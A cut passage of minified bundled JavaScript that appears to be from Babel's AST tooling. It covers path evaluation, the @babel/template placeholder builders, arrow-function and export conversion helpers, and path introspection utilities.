Y=X.get("callee"),W,G;if(Y.isIdentifier()&&!X.scope.getBinding(Y.node.name)&&(BO(Y.node.name)||VT1(Y.node.name)))G=global[Y.node.name];if(Y.isMemberExpression()){let H=Y.get("object"),z=Y.get("property");if(H.isIdentifier()&&z.isIdentifier()&&BO(H.node.name)&&!KT1(z.node.name)){W=global[H.node.name];let $=z.node.name;if(hasOwnProperty.call(W,$))G=W[$]}if(H.isLiteral()&&z.isIdentifier()){let $=typeof H.node.value;if($==="string"||$==="number")W=H.node.value,G=W[z.node.name]}}if(G){let H=X.get("arguments").map((z)=>o0(z,J));if(!J.confident)return;return G.apply(W,H)}}p9(X,J)}function jO(X,J,Q,Y=!1){let W="",G=0,H=X.isTemplateLiteral()?X.get("expressions"):X.get("quasi.expressions");for(let z of J){if(!Q.confident)break;W+=Y?z.value.raw:z.value.cooked;let $=H[G++];if($)W+=String(o0($,Q))}if(!Q.confident)return;return W}function qT1(){let X={confident:!0,deoptPath:null,seen:new Map},J=o0(this,X);if(!X.confident)J=void 0;return{confident:X.confident,deopt:X.deoptPath,value:J}}});var DO=v((RO)=>{Object.defineProperty(RO,"__esModule",{value:!0});RO.statements=RO.statement=RO.smart=RO.program=RO.expression=void 0;var jT1=y1(),{assertExpressionStatement:OT1}=jT1;function eW(X){return{code:(J)=>`/* @babel/template */;
${J}`,validate:()=>{},unwrap:(J)=>{return X(J.program.body.slice(1))}}}var Jo1=RO.smart=eW((X)=>{if(X.length>1)return X;else return X[0]}),Qo1=RO.statements=eW((X)=>X),Yo1=RO.statement=eW((X)=>{if(X.length===0)throw Error("Found nothing to return.");if(X.length>1)throw Error("Found multiple statements but wanted one");return X[0]}),FT1=RO.expression={code:(X)=>`(
${X}
)`,validate:(X)=>{if(X.program.body.length>1)throw Error("Found multiple statements but wanted one");if(FT1.unwrap(X).start===0)throw Error("Parse result included parens.")},unwrap:({program:X})=>{let[J]=X.body;return OT1(J),J.expression}},Wo1=RO.program={code:(X)=>X,validate:()=>{},unwrap:(X)=>X.program}});var E4=v((wO)=>{Object.defineProperty(wO,"__esModule",{value:!0});wO.merge=IT1;wO.normalizeReplacements=PT1;wO.validate=CT1;var NT1=["placeholderWhitelist","placeholderPattern","preserveComments","syntacticPlaceholders"];function LT1(X,J){if(X==null)return{};var Q={};for(var Y in X)if({}.hasOwnProperty.call(X,Y)){if(J.indexOf(Y)!==-1)continue;Q[Y]=X[Y]}return Q}function IT1(X,J){let{placeholderWhitelist:Q=X.placeholderWhitelist,placeholderPattern:Y=X.placeholderPattern,preserveComments:W=X.preserveComments,syntacticPlaceholders:G=X.syntacticPlaceholders}=J;return{parser:Object.assign({},X.parser,J.parser),placeholderWhitelist:Q,placeholderPattern:Y,preserveComments:W,syntacticPlaceholders:G}}function CT1(X){if(X!=null&&typeof X!=="object")throw Error("Unknown template options.");let J=X||{},{placeholderWhitelist:Q,placeholderPattern:Y,preserveComments:W,syntacticPlaceholders:G}=J,H=LT1(J,NT1);if(Q!=null&&!(Q instanceof Set))throw Error("'.placeholderWhitelist' must be a Set, null, or undefined");if(Y!=null&&!(Y instanceof RegExp)&&Y!==!1)throw Error("'.placeholderPattern' must be a RegExp, false, null, or undefined");if(W!=null&&typeof W!=="boolean")throw Error("'.preserveComments' must be a boolean, null, or undefined");if(G!=null&&typeof G!=="boolean")throw Error("'.syntacticPlaceholders' must be a boolean, null, or undefined");if(G===!0&&(Q!=null||Y!=null))throw Error("'.placeholderWhitelist' and '.placeholderPattern' aren't compatible with '.syntacticPlaceholders: true'");return{parser:H,placeholderWhitelist:Q||void 0,placeholderPattern:Y==null?void 0:Y,preserveComments:W==null?void 0:W,syntacticPlaceholders:G==null?void 0:G}}function PT1(X){if(Array.isArray(X))return X.reduce((J,Q,Y)=>{return J["$"+Y]=Q,J},{});else if(typeof X==="object"||X==null)return X||void 0;throw Error("Template replacements must be an array, object, null, or undefined")}});var X3=v((LO)=>{Object.defineProperty(LO,"__esModule",{value:!0});LO.default=pT1;var ET1=y1(),kT1=y5(),bT1=mW(),{isCallExpression:vT1,isExpressionStatement:fT1,isFunction:xT1,isIdentifier:hT1,isJSXIdentifier:yT1,isNewExpression:gT1,isPlaceholder:k4,isStatement:mT1,isStringLiteral:NO,removePropertiesDeep:uT1,traverse:cT1}=ET1,lT1=/^[_$A-Z0-9]+$/;function pT1(X,J,Q){let{placeholderWhitelist:Y,placeholderPattern:W,preserveComments:G,syntacticPlaceholders:H}=Q,z=rT1(J,Q.parser,H);uT1(z,{preserveComments:G}),X.validate(z);let $={syntactic:{placeholders:[],placeholderNames:new Set},legacy:{placeholders:[],placeholderNames:new Set},placeholderWhitelist:Y,placeholderPattern:W,syntacticPlaceholders:H};return cT1(z,dT1,$),Object.assign({ast:z},$.syntactic.placeholders.length?$.syntactic:$.legacy)}function dT1(X,J,Q){var Y;let W,G=Q.syntactic.placeholders.length>0;if(k4(X)){if(Q.syntacticPlaceholders===!1)throw Error("%%foo%%-style placeholders can't be used when '.syntacticPlaceholders' is false.");W=X.name.name,G=!0}else if(G||Q.syntacticPlaceholders)return;else if(hT1(X)||yT1(X))W=X.name;else if(NO(X))W=X.value;else return;if(G&&(Q.placeholderPattern!=null||Q.placeholderWhitelist!=null))throw Error("'.placeholderWhitelist' and '.placeholderPattern' aren't compatible with '.syntacticPlaceholders: true'");if(!G&&(Q.placeholderPattern===!1||!(Q.placeholderPattern||lT1).test(W))&&!((Y=Q.placeholderWhitelist)!=null&&Y.has(W)))return;J=J.slice();let{node:H,key:z}=J[J.length-1],$;if(NO(X)||k4(X,{expectedNode:"StringLiteral"}))$="string";else if(gT1(H)&&z==="arguments"||vT1(H)&&z==="arguments"||xT1(H)&&z==="params")$="param";else if(fT1(H)&&!k4(X))$="statement",J=J.slice(0,-1);else if(mT1(X)&&k4(X))$="statement";else $="other";let{placeholders:V,placeholderNames:K}=!G?Q.legacy:Q.syntactic;V.push({name:W,type:$,resolve:(Z)=>iT1(Z,J),isDuplicate:K.has(W)}),K.add(W)}function iT1(X,J){let Q=X;for(let G=0;G<J.length-1;G++){let{key:H,index:z}=J[G];if(z===void 0)Q=Q[H];else Q=Q[H][z]}let{key:Y,index:W}=J[J.length-1];return{parent:Q,key:Y,index:W}}function rT1(X,J,Q){let Y=(J.plugins||[]).slice();if(Q!==!1)Y.push("placeholders");J=Object.assign({allowAwaitOutsideFunction:!0,allowReturnOutsideFunction:!0,allowNewTargetOutsideFunction:!0,allowSuperOutsideMethod:!0,allowYieldOutsideFunction:!0,sourceType:"module"},J,{plugins:Y});try{return(0,kT1.parse)(X,J)}catch(W){let G=W.loc;if(G)W.message+=`
`+(0,bT1.codeFrameColumns)(X,{start:G}),W.code="BABEL_TEMPLATE_PARSE_ERROR";throw W}}});var Y3=v((PO)=>{Object.defineProperty(PO,"__esModule",{value:!0});PO.default=X_1;var nT1=y1(),{blockStatement:sT1,cloneNode:Q3,emptyStatement:oT1,expressionStatement:J3,identifier:b4,isStatement:IO,isStringLiteral:tT1,stringLiteral:eT1,validate:CO}=nT1;function X_1(X,J){let Q=Q3(X.ast);if(J)X.placeholders.forEach((Y)=>{if(!hasOwnProperty.call(J,Y.name)){let W=Y.name;throw Error(`Error: No substitution given for "${W}". If this is not meant to be a
            placeholder you may want to consider passing one of the following options to @babel/template:
            - { placeholderPattern: false, placeholderWhitelist: new Set(['${W}'])}
            - { placeholderPattern: /^${W}$/ }`)}}),Object.keys(J).forEach((Y)=>{if(!X.placeholderNames.has(Y))throw Error(`Unknown substitution "${Y}" given`)});return X.placeholders.slice().reverse().forEach((Y)=>{try{var W;J_1(Y,Q,(W=J&&J[Y.name])!=null?W:null)}catch(G){throw G.message=`@babel/template placeholder "${Y.name}": ${G.message}`,G}}),Q}function J_1(X,J,Q){if(X.isDuplicate){if(Array.isArray(Q))Q=Q.map((z)=>Q3(z));else if(typeof Q==="object")Q=Q3(Q)}let{parent:Y,key:W,index:G}=X.resolve(J);if(X.type==="string"){if(typeof Q==="string")Q=eT1(Q);if(!Q||!tT1(Q))throw Error("Expected string substitution")}else if(X.type==="statement"){if(G===void 0){if(!Q)Q=oT1();else if(Array.isArray(Q))Q=sT1(Q);else if(typeof Q==="string")Q=J3(b4(Q));else if(!IO(Q))Q=J3(Q)}else if(Q&&!Array.isArray(Q)){if(typeof Q==="string")Q=b4(Q);if(!IO(Q))Q=J3(Q)}}else if(X.type==="param"){if(typeof Q==="string")Q=b4(Q);if(G===void 0)throw Error("Assertion failure.")}else{if(typeof Q==="string")Q=b4(Q);if(Array.isArray(Q))throw Error("Cannot replace single expression with an array.")}function H(z,$,V){let K=z[$];if(z[$]=V,K.type==="Identifier"||K.type==="Placeholder"){if(K.typeAnnotation)V.typeAnnotation=K.typeAnnotation;if(K.optional)V.optional=K.optional;if(K.decorators)V.decorators=K.decorators}}if(G===void 0)CO(Y,W,Q),H(Y,W,Q);else{let z=Y[W].slice();if(X.type==="statement"||X.type==="param")if(Q==null)z.splice(G,1);else if(Array.isArray(Q))z.splice(G,1,...Q);else H(z,G,Q);else H(z,G,Q);CO(Y,W,z),Y[W]=z}}});var TO=v((SO)=>{Object.defineProperty(SO,"__esModule",{value:!0});SO.default=H_1;var Y_1=E4(),W_1=X3(),G_1=Y3();function H_1(X,J,Q){J=X.code(J);let Y;return(W)=>{let G=(0,Y_1.normalizeReplacements)(W);if(!Y)Y=(0,W_1.default)(X,J,Q);return X.unwrap((0,G_1.default)(Y,G))}}});var EO=v((_O)=>{Object.defineProperty(_O,"__esModule",{value:!0});_O.default=U_1;var $_1=E4(),V_1=X3(),K_1=Y3();function U_1(X,J,Q){let{metadata:Y,names:W}=Z_1(X,J,Q);return(G)=>{let H={};return G.forEach((z,$)=>{H[W[$]]=z}),(z)=>{let $=(0,$_1.normalizeReplacements)(z);if($)Object.keys($).forEach((V)=>{if(hasOwnProperty.call(H,V))throw Error("Unexpected replacement overlap.")});return X.unwrap((0,K_1.default)(Y,$?Object.assign($,H):H))}}}function Z_1(X,J,Q){let Y="BABEL_TPL$",W=J.join("");do Y="$$"+Y;while(W.includes(Y));let{names:G,code:H}=q_1(J,Y);return{metadata:(0,V_1.default)(X,X.code(H),{parser:Q.parser,placeholderWhitelist:new Set(G.concat(Q.placeholderWhitelist?Array.from(Q.placeholderWhitelist):[])),placeholderPattern:Q.placeholderPattern,preserveComments:Q.preserveComments,syntacticPlaceholders:Q.syntacticPlaceholders}),names:G}}function q_1(X,J){let Q=[],Y=X[0];for(let W=1;W<X.length;W++){let G=`${J}${W-1}`;Q.push(G),Y+=G+X[W]}return{names:Q,code:Y}}});var yO=v((hO)=>{Object.defineProperty(hO,"__esModule",{value:!0});hO.default=xO;var V6=E4(),kO=TO(),bO=EO(),vO=(0,V6.validate)({placeholderPattern:!1});function xO(X,J){let Q=new WeakMap,Y=new WeakMap,W=J||(0,V6.validate)(null);return Object.assign((G,...H)=>{if(typeof G==="string"){if(H.length>1)throw Error("Unexpected extra params.");return fO((0,kO.default)(X,G,(0,V6.merge)(W,(0,V6.validate)(H[0]))))}else if(Array.isArray(G)){let z=Q.get(G);if(!z)z=(0,bO.default)(X,G,W),Q.set(G,z);return fO(z(H))}else if(typeof G==="object"&&G){if(H.length>0)throw Error("Unexpected extra params.");return xO(X,(0,V6.merge)(W,(0,V6.validate)(G)))}throw Error(`Unexpected template param ${typeof G}`)},{ast:(G,...H)=>{if(typeof G==="string"){if(H.length>1)throw Error("Unexpected extra params.");return(0,kO.default)(X,G,(0,V6.merge)((0,V6.merge)(W,(0,V6.validate)(H[0])),vO))()}else if(Array.isArray(G)){let z=Y.get(G);if(!z)z=(0,bO.default)(X,G,(0,V6.merge)(W,vO)),Y.set(G,z);return z(H)()}throw Error(`Unexpected template param ${typeof G}`)}})}function fO(X){let J="";try{throw Error()}catch(Q){if(Q.stack)J=Q.stack.split(`
`).slice(3).join(`
`)}return(Q)=>{try{return X(Q)}catch(Y){throw Y.stack+=`
    =============
${J}`,Y}}}});var uO=v((gO)=>{Object.defineProperty(gO,"__esModule",{value:!0});gO.statements=gO.statement=gO.smart=gO.program=gO.expression=gO.default=void 0;var R7=DO(),A7=yO(),W3=gO.smart=(0,A7.default)(R7.smart),j_1=gO.statement=(0,A7.default)(R7.statement),O_1=gO.statements=(0,A7.default)(R7.statements),F_1=gO.expression=(0,A7.default)(R7.expression),R_1=gO.program=(0,A7.default)(R7.program),Zo1=gO.default=Object.assign(W3.bind(void 0),{smart:W3,statement:j_1,statements:O_1,expression:F_1,program:R_1,ast:W3.ast})});var sO=v((nO)=>{Object.defineProperty(nO,"__esModule",{value:!0});nO.arrowFunctionToExpression=XE1;nO.ensureBlock=o_1;nO.ensureFunctionName=ZE1;nO.splitExportDeclaration=KE1;nO.toComputedKey=s_1;nO.unwrapFunctionEnvironment=t_1;var I_1=y1(),C_1=uO(),z3=G4(),P_1=l9(),{arrowFunctionExpression:$3,assignmentExpression:iX,binaryExpression:G3,blockStatement:S_1,callExpression:o8,conditionalExpression:T_1,expressionStatement:pO,identifier:H0,isIdentifier:__1,jsxIdentifier:E_1,logicalExpression:k_1,LOGICAL_OPERATORS:b_1,memberExpression:d9,metaProperty:v_1,numericLiteral:f_1,objectExpression:x_1,restElement:h_1,returnStatement:y_1,sequenceExpression:g_1,spreadElement:m_1,stringLiteral:dO,super:H3,thisExpression:D7,toExpression:iO,unaryExpression:u_1,toBindingIdentifierName:c_1,isFunction:l_1,isAssignmentPattern:p_1,isRestElement:d_1,getFunctionName:i_1,cloneNode:rX,variableDeclaration:r_1,variableDeclarator:a_1,exportNamedDeclaration:cO,exportSpecifier:lO,inherits:n_1}=I_1;function s_1(){let X;if(this.isMemberExpression())X=this.node.property;else if(this.isProperty()||this.isMethod())X=this.node.key;else throw ReferenceError("todo");if(!this.node.computed){if(__1(X))X=dO(X.name)}return X}function o_1(){let X=this.get("body"),J=X.node;if(Array.isArray(X))throw Error("Can't convert array path to a block statement");if(!J)throw Error("Can't convert node without a body");if(X.isBlockStatement())return J;let Q=[],Y="body",W,G;if(X.isStatement())G="body",W=0,Q.push(X.node);else if(Y+=".body.0",this.isFunction())W="argument",Q.push(y_1(X.node));else W="expression",Q.push(pO(X.node));this.node.body=S_1(Q);let H=this.get(Y);return P_1.setup.call(X,H,G?H.node[G]:H.node,G,W),this.node}nO.arrowFunctionToShadowed=function(){if(!this.isArrowFunctionExpression())return;this.arrowFunctionToExpression()};function t_1(){if(!this.isArrowFunctionExpression()&&!this.isFunctionExpression()&&!this.isFunctionDeclaration())throw this.buildCodeFrameError("Can only unwrap the environment of a function.");rO(this)}function e_1(X,J){X.node.type=J}function XE1({allowInsertArrow:X=!0,allowInsertArrowWithRest:J=X,noNewArrows:Q=!((Y)=>(Y=arguments[0])==null?void 0:Y.specCompliant)()}={}){if(!this.isArrowFunctionExpression())throw this.buildCodeFrameError("Cannot convert non-arrow function to a function expression.");let Y=this;if(!Q){var W;Y=(W=Y.ensureFunctionName(!1))!=null?W:Y}let{thisBinding:G,fnPath:H}=rO(Y,Q,X,J);if(H.ensureBlock(),e_1(H,"FunctionExpression"),!Q){let z=G?null:H.scope.generateUidIdentifier("arrowCheckId");if(z)H.parentPath.scope.push({id:z,init:x_1([])});return H.get("body").unshiftContainer("body",pO(o8(this.hub.addHelper("newArrowCheck"),[D7(),z?H0(z.name):H0(G)]))),H.replaceWith(o8(d9(H.node,H0("bind")),[z?H0(z.name):D7()])),H.get("callee.object")}return H}var JE1=(0,z3.environmentVisitor)({CallExpression(X,{allSuperCalls:J}){if(!X.get("callee").isSuper())return;J.push(X)}});function rO(X,J=!0,Q=!0,Y=!0){let W,G=X.findParent((B)=>{if(B.isArrowFunctionExpression())return W!=null||(W=B),!1;return B.isFunction()||B.isProgram()||B.isClassProperty({static:!1})||B.isClassPrivateProperty({static:!1})}),H=G.isClassMethod({kind:"constructor"});if(G.isClassProperty()||G.isClassPrivateProperty())if(W)G=W;else if(Q)X.replaceWith(o8($3([],iO(X.node)),[])),G=X.get("callee"),X=G.get("body");else throw X.buildCodeFrameError("Unable to transform arrow inside class property");let{thisPaths:z,argumentsPaths:$,newTargetPaths:V,superProps:K,superCalls:Z}=VE1(X);if(H&&Z.length>0){if(!Q)throw Z[0].buildCodeFrameError("When using '@babel/plugin-transform-arrow-functions', it's not possible to compile `super()` in an arrow function without compiling classes.\nPlease add '@babel/plugin-transform-classes' to your Babel configuration.");if(!Y)throw Z[0].buildCodeFrameError("When using '@babel/plugin-transform-parameters', it's not possible to compile `super()` in an arrow function with default or rest parameters without compiling classes.\nPlease add '@babel/plugin-transform-classes' to your Babel configuration.");let B=[];G.traverse(JE1,{allSuperCalls:B});let M=HE1(G);B.forEach((O)=>{let R=H0(M);R.loc=O.node.callee.loc,O.get("callee").replaceWith(R)})}if($.length>0){let B=w7(G,"arguments",()=>{let M=()=>H0("arguments");if(G.scope.path.isProgram())return T_1(G3("===",u_1("typeof",M()),dO("undefined")),G.scope.buildUndefinedNode(),M());else return M()});$.forEach((M)=>{let O=H0(B);O.loc=M.node.loc,M.replaceWith(O)})}if(V.length>0){let B=w7(G,"newtarget",()=>v_1(H0("new"),H0("target")));V.forEach((M)=>{let O=H0(B);O.loc=M.node.loc,M.replaceWith(O)})}if(K.length>0){if(!Q)throw K[0].buildCodeFrameError("When using '@babel/plugin-transform-arrow-functions', it's not possible to compile `super.prop` in an arrow function without compiling classes.\nPlease add '@babel/plugin-transform-classes' to your Babel configuration.");K.reduce((M,O)=>M.concat(YE1(O)),[]).forEach((M)=>{let O=M.node.computed?"":M.get("property").node.name,R=M.parentPath,I=R.isAssignmentExpression({left:M.node}),F=R.isCallExpression({callee:M.node}),T=R.isTaggedTemplateExpression({tag:M.node}),b=zE1(G,I,O),h=[];if(M.node.computed)h.push(M.get("property").node);if(I){let N=R.node.right;h.push(N)}let L=o8(H0(b),h);if(F)R.unshiftContainer("arguments",D7()),M.replaceWith(d9(L,H0("call"))),z.push(R.get("arguments.0"));else if(I)R.replaceWith(L);else if(T)M.replaceWith(o8(d9(L,H0("bind"),!1),[D7()])),z.push(M.get("arguments.0"));else M.replaceWith(L)})}let q;if(z.length>0||!J){if(q=GE1(G,H),J||H&&aO(G)){if(z.forEach((B)=>{let M=B.isJSX()?E_1(q):H0(q);M.loc=B.node.loc,B.replaceWith(M)}),!J)q=null}}return{thisBinding:q,fnPath:X}}function QE1(X){return b_1.includes(X)}function YE1(X){if(X.parentPath.isAssignmentExpression()&&X.parentPath.node.operator!=="="){let Q=X.parentPath,Y=Q.node.operator.slice(0,-1),W=Q.node.right,G=QE1(Y);if(X.node.computed){let H=X.scope.generateDeclaredUidIdentifier("tmp"),z=X.node.object,$=X.node.property;Q.get("left").replaceWith(d9(z,iX("=",H,$),!0)),Q.get("right").replaceWith(J(G?"=":Y,d9(z,H0(H.name),!0),W))}else{let H=X.node.object,z=X.node.property;Q.get("left").replaceWith(d9(H,z)),Q.get("right").replaceWith(J(G?"=":Y,d9(H,H0(z.name)),W))}if(G)Q.replaceWith(k_1(Y,Q.node.left,Q.node.right));else Q.node.operator="=";return[Q.get("left"),Q.get("right").get("left")]}else if(X.parentPath.isUpdateExpression()){let Q=X.parentPath,Y=X.scope.generateDeclaredUidIdentifier("tmp"),W=X.node.computed?X.scope.generateDeclaredUidIdentifier("prop"):null,G=[iX("=",Y,d9(X.node.object,W?iX("=",W,X.node.property):X.node.property,X.node.computed)),iX("=",d9(X.node.object,W?H0(W.name):X.node.property,X.node.computed),G3(X.parentPath.node.operator[0],H0(Y.name),f_1(1)))];if(!X.parentPath.node.prefix)G.push(H0(Y.name));Q.replaceWith(g_1(G));let H=Q.get("expressions.0.right"),z=Q.get("expressions.1.left");return[H,z]}return[X];function J(Q,Y,W){if(Q==="=")return iX("=",Y,W);else return G3(Q,Y,W)}}function aO(X){return X.isClassMethod()&&!!X.parentPath.parentPath.node.superClass}var WE1=(0,z3.environmentVisitor)({CallExpression(X,{supers:J,thisBinding:Q}){if(!X.get("callee").isSuper())return;if(J.has(X.node))return;J.add(X.node),X.replaceWithMultiple([X.node,iX("=",H0(Q),H0("this"))])}});function GE1(X,J){return w7(X,"this",(Q)=>{if(!J||!aO(X))return D7();X.traverse(WE1,{supers:new WeakSet,thisBinding:Q})})}function HE1(X){return w7(X,"supercall",()=>{let J=X.scope.generateUidIdentifier("args");return $3([h_1(J)],o8(H3(),[m_1(H0(J.name))]))})}function zE1(X,J,Q){return w7(X,`superprop_${J?"set":"get"}:${Q||""}`,()=>{let W=[],G;if(Q)G=d9(H3(),H0(Q));else{let H=X.scope.generateUidIdentifier("prop");W.unshift(H),G=d9(H3(),H0(H.name),!0)}if(J){let H=X.scope.generateUidIdentifier("value");W.push(H),G=iX("=",G,H0(H.name))}return $3(W,G)})}function w7(X,J,Q){let Y="binding:"+J,W=X.getData(Y);if(!W){let G=X.scope.generateUidIdentifier(J);W=G.name,X.setData(Y,W),X.scope.push({id:G,init:Q(W)})}return W}var $E1=(0,z3.environmentVisitor)({ThisExpression(X,{thisPaths:J}){J.push(X)},JSXIdentifier(X,{thisPaths:J}){if(X.node.name!=="this")return;if(!X.parentPath.isJSXMemberExpression({object:X.node})&&!X.parentPath.isJSXOpeningElement({name:X.node}))return;J.push(X)},CallExpression(X,{superCalls:J}){if(X.get("callee").isSuper())J.push(X)},MemberExpression(X,{superProps:J}){if(X.get("object").isSuper())J.push(X)},Identifier(X,{argumentsPaths:J}){if(!X.isReferencedIdentifier({name:"arguments"}))return;let Q=X.scope;do{if(Q.hasOwnBinding("arguments")){Q.rename("arguments");return}if(Q.path.isFunction()&&!Q.path.isArrowFunctionExpression())break}while(Q=Q.parent);J.push(X)},MetaProperty(X,{newTargetPaths:J}){if(!X.get("meta").isIdentifier({name:"new"}))return;if(!X.get("property").isIdentifier({name:"target"}))return;J.push(X)}});function VE1(X){let J=[],Q=[],Y=[],W=[],G=[];return X.traverse($E1,{thisPaths:J,argumentsPaths:Q,newTargetPaths:Y,superProps:W,superCalls:G}),{thisPaths:J,argumentsPaths:Q,newTargetPaths:Y,superProps:W,superCalls:G}}function KE1(){if(!this.isExportDeclaration()||this.isExportAllDeclaration())throw Error("Only default and named export declarations can be split.");if(this.isExportNamedDeclaration()&&this.get("specifiers").length>0)throw Error("It doesn't make sense to split exported specifiers.");let X=this.get("declaration");if(this.isExportDefaultDeclaration()){let W=X.isFunctionDeclaration()||X.isClassDeclaration(),G=X.isFunctionExpression()||X.isClassExpression(),H=X.isScope()?X.scope.parent:X.scope,z=X.node.id,$=!1;if(!z){if($=!0,z=H.generateUidIdentifier("default"),W||G)X.node.id=rX(z)}else if(G&&H.hasBinding(z.name))$=!0,z=H.generateUidIdentifier(z.name);let V=W?X.node:r_1("var",[a_1(rX(z),X.node)]),K=cO(null,[lO(rX(z),H0("default"))]);if(this.insertAfter(K),this.replaceWith(V),$)H.registerDeclaration(this);return this}else if(this.get("specifiers").length>0)throw Error("It doesn't make sense to split exported specifiers.");let J=X.getOuterBindingIdentifiers(),Q=Object.keys(J).map((W)=>{return lO(H0(W),H0(W))}),Y=cO(null,Q);return this.insertAfter(Y),this.replaceWith(X.node),this}var UE1={"ReferencedIdentifier|BindingIdentifier"(X,J){if(X.node.name!==J.name)return;J.needsRename=!0,X.stop()},Scope(X,J){if(X.scope.hasOwnBinding(J.name))X.skip()}};function ZE1(X){if(this.node.id)return this;let J=i_1(this.node,this.parent);if(J==null)return this;let{name:Q}=J;if(!X&&/[\uD800-\uDFFF]/.test(Q))return null;if(Q.startsWith("get ")||Q.startsWith("set "))return null;Q=c_1(Q.replace(/[/ ]/g,"_"));let Y=H0(Q);n_1(Y,J.originalNode);let W={needsRename:!1,name:Q},{scope:G}=this,H=G.getOwnBinding(Q);if(H){if(H.kind==="param")W.needsRename=!0}else if(G.parent.hasBinding(Q)||G.hasGlobal(Q))this.traverse(UE1,W);if(!W.needsRename)return this.node.id=Y,G.getProgramParent().references[Y.name]=!0,this;if(G.hasBinding(Y.name)&&!G.hasGlobal(Y.name))return G.rename(Y.name),this.node.id=Y,G.getProgramParent().references[Y.name]=!0,this;if(!l_1(this.node))return null;let z=G.generateUidIdentifier(Y.name),$=[];for(let K=0,Z=qE1(this.node);K<Z;K++)$.push(G.generateUidIdentifier("x"));let V=C_1.default.expression.ast`
    (function (${z}) {
      function ${Y}(${$}) {
        return ${rX(z)}.apply(this, arguments);
      }

      ${rX(Y)}.toString = function () {
        return ${rX(z)}.toString();
      }

      return ${rX(Y)};
    })(${iO(this.node)})
  `;return this.replaceWith(V)[0].get("arguments.0")}function qE1(X){let J=X.params.findIndex((Q)=>p_1(Q)||d_1(Q));return J===-1?X.params.length:J}});var YF=v((QF)=>{Object.defineProperty(QF,"__esModule",{value:!0});QF._guessExecutionStatusRelativeTo=mE1;QF._resolve=JF;QF.canHaveVariableDeclarationOrExpression=kE1;QF.canSwapBetweenExpressionAndStatement=bE1;QF.getSource=hE1;QF.isCompletionRecord=vE1;QF.isConstantExpression=pE1;QF.isInStrictMode=dE1;QF.isNodeType=EE1;QF.isStatementOrBlock=fE1;QF.isStatic=_E1;QF.matchesPattern=TE1;QF.referencesImport=xE1;QF.resolve=lE1;QF.willIMaybeExecuteBefore=yE1;var AE1=y1(),{STATEMENT_OR_BLOCK_KEYS:DE1,VISITOR_KEYS:wE1,isBlockStatement:XF,isExpression:NE1,isIdentifier:LE1,isLiteral:IE1,isStringLiteral:CE1,isType:PE1,matchesPattern:SE1}=AE1;function TE1(X,J){return SE1(this.node,X,J)}QF.has=function(J){var Q;let Y=(Q=this.node)==null?void 0:Q[J];if(Y&&Array.isArray(Y))return!!Y.length;else return!!Y};function _E1(){return this.scope.isStatic(this.node)}QF.is=QF.has,QF.isnt=function(J){return!this.has(J)},QF.equals=function(J,Q){return this.node[J]===Q};function EE1(X){return PE1(this.type,X)}function kE1(){return(this.key==="init"||this.key==="left")&&this.parentPath.isFor()}function bE1(X){if(this.key!=="body"||!this.parentPath.isArrowFunctionExpression())return!1;if(this.isExpression())return XF(X);else if(this.isBlockStatement())return NE1(X);return!1}function vE1(X){let J=this,Q=!0;do{let{type:Y,container:W}=J;if(!Q&&(J.isFunction()||Y==="StaticBlock"))return!!X;if(Q=!1,Array.isArray(W)&&J.key!==W.length-1)return!1}while((J=J.parentPath)&&!J.isProgram()&&!J.isDoExpression());return!0}function fE1(){if(this.parentPath.isLabeledStatement()||XF(this.container))return!1;else return DE1.includes(this.key)}function xE1(X,J){if(!this.isReferencedIdentifier()){if(this.isJSXMemberExpression()&&this.node.property.name===J||(this.isMemberExpression()||this.isOptionalMemberExpression())&&(this.node.computed?CE1(this.node.property,{value:J}):this.node.property.name===J)){let G=this.get("object");return G.isReferencedIdentifier()&&G.referencesImport(X,"*")}return!1}let Q=this.scope.getBinding(this.node.name);if(!Q||Q.kind!=="module")return!1;let Y=Q.path,W=Y.parentPath;if(!W.isImportDeclaration())return!1;if(W.node.source.value===X){if(!J)return!0}else return!1;if(Y.isImportDefaultSpecifier()&&J==="default")return!0;if(Y.isImportNamespaceSpecifier()&&J==="*")return!0;if(Y.isImportSpecifier()&&LE1(Y.node.imported,{name:J}))return!0;return!1}function hE1(){let X=this.node;if(X.end){let J=this.hub.getCode();if(J)return J.slice(X.start,X.end)}return""}function yE1(X){return this._guessExecutionStatusRelativeTo(X)!=="after"}function oO(X){return X.isProgram()?X:(X.parentPath.scope.getFunctionParent()||X.parentPath.scope.getProgramParent()).path}function gE1(X,J){switch(X){case"LogicalExpression":return J==="right";case"ConditionalExpression":case"IfStatement":return J==="consequent"||J==="alternate";case"WhileStatement":case"DoWhileStatement":case"ForInStatement":case"ForOfStatement":return J==="body";case"ForStatement":return J==="body"||J==="update";case"SwitchStatement":return J==="cases";case"TryStatement":return J==="handler";case"AssignmentPattern":return J==="right";case"OptionalMemberExpression":return J==="property";case"OptionalCallExpression":return J==="arguments";default:return!1}}function tO(X,J){for(let Q=0;Q<J;Q++){let Y=X[Q];if(gE1(Y.parent.type,Y.parentKey))return!0}return!1}var eO=Symbol();function mE1(X){return V3(this,X,new Map)}function V3(X,J,Q){let Y={this:oO(X),target:oO(J)};if(Y.target.node!==Y.this.node)return cE1(X,Y.target,Q);let W={target:J.getAncestry(),this:X.getAncestry()};if(W.target.includes(X))return"after";if(W.this.includes(J))return"before";let G,H={target:0,this:0};while(!G&&H.this<W.this.length){let K=W.this[H.this];if(H.target=W.target.indexOf(K),H.target>=0)G=K;else H.this++}if(!G)throw Error("Internal Babel error - The two compared nodes don't appear to belong to the same program.");if(tO(W.this,H.this-1)||tO(W.target,H.target-1))return"unknown";let z={this:W.this[H.this-1],target:W.target[H.target-1]};if(z.target.listKey&&z.this.listKey&&z.target.container===z.this.container)return z.target.key>z.this.key?"before":"after";let $=wE1[G.type],V={this:$.indexOf(z.this.parentKey),target:$.indexOf(z.target.parentKey)};return V.target>V.this?"before":"after"}function uE1(X,J,Q){if(!J.isFunctionDeclaration()){if(V3(X,J,Q)==="before")return"before";return"unknown"}else if(J.parentPath.isExportDeclaration())return"unknown";let Y=J.scope.getBinding(J.node.id.name);if(!Y.references)return"before";let W=Y.referencePaths,G;for(let H of W){if(!!H.find((V)=>V.node===J.node))continue;if(H.key!=="callee"||!H.parentPath.isCallExpression())return"unknown";let $=V3(X,H,Q);if(G&&G!==$)return"unknown";else G=$}return G}function cE1(X,J,Q){let Y=Q.get(X.node),W;if(!Y)Q.set(X.node,Y=new Map);else if(W=Y.get(J.node)){if(W===eO)return"unknown";return W}Y.set(J.node,eO);let G=uE1(X,J,Q);return Y.set(J.node,G),G}function lE1(X,J){return JF.call(this,X,J)||this}function JF(X,J){var 